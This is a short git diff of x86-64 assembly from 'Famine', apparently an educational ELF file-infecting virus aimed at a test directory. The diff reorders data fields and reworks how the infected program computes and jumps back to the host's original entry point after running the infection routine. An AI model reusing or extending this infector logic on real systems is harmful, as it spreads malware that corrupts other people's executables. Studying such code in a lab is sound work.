@@ -49,8 +49,10 @@ print_rax:
 	path	db '/root/famine/test_dir/', 0
 	padd	times 0512 db 0
 	file	db 'elf64 found!', 0
-	self	db '/proc/self/exe', 0
 	msg1	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
+	old_entry		   dq 0
+	new_entry		   dq 0
+	self	db '/proc/self/exe', 0
 	last	db '..', 0
 	curr	db '.', 0
 	elfh	db 0x7f, 'ELF'
@@ -58,8 +60,6 @@ print_rax:
 	zero	db 0
 	entry	dq 0
 	exec	dw 7
-	old_entry		   dq 0
-	new_entry		   dq 0
 	elfb	times 0064 db 0
 	elfp0	times 0056 db 0
 	elfp1	times 0056 db 0
@@ -574,6 +574,13 @@ end_:
 	mov		rax, [rel entry]
 	mov		[rel new_entry], rax
 
+	mov		rax, [rel new_entry]
+	sub		rax, [rel old_entry]
+	lea		rdi, [rel _start]
+	sub		rdi, rax
+
+	mov		[rel new_entry], rdi
+
 	call	famine
 
 	mov		rax, SYS_open
@@ -601,16 +608,12 @@ end_:
 
 .just_quit:
 	POP_ALL
-
 	mov		al, BYTE [rel zero]
 	test	al, al
 	jz		.exit_ret
 
-	mov		rax, [rel new_entry]
-	sub		rax, [rel old_entry]
-	lea		rdi, [rel _start]
-	sub		rdi, rax
-	jmp		rdi
+
+	jmp		[rel new_entry]
 
 .exit_ret:
 
